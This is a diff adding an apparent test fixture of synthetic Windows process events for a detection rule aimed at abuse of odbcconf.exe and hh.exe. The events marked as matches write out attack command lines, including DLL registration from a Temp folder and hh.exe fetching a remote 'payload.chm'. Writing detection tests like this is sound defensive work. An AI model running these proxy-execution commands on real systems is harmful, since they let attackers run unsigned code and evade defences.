@@ -1,0 +1,79 @@
+docs:
+- id: odbc
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process:
+      name: odbcconf.exe
+      executable: C:\Windows\System32\odbcconf.exe
+      command_line: odbcconf -a {REGSVR C:\Users\alice\AppData\Local\Temp\a.dll}
+      parent: {name: explorer.exe}
+- id: odbc-rsp
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process:
+      name: odbcconf.exe
+      executable: C:\Windows\System32\odbcconf.exe
+      command_line: odbcconf -f C:\temp\a.rsp
+      parent: {name: explorer.exe}
+- id: hh-url
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process:
+      name: hh.exe
+      executable: C:\Windows\System32\hh.exe
+      command_line: hh.exe http://203.0.113.9/payload.chm
+      parent: {name: explorer.exe}
+- id: hh-temp
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process:
+      name: hh.exe
+      executable: C:\Windows\System32\hh.exe
+      command_line: hh.exe C:\Users\alice\AppData\Local\Temp\help.chm
+      parent: {name: explorer.exe}
+- id: hh-local
+  match: false
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process:
+      name: hh.exe
+      executable: C:\Windows\System32\hh.exe
+      command_line: hh.exe C:\Program Files\App\help.chm
+      parent: {name: explorer.exe}
+- id: odbc-plain
+  match: false
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process:
+      name: odbcconf.exe
+      executable: C:\Windows\System32\odbcconf.exe
+      command_line: odbcconf /?
+      parent: {name: explorer.exe}
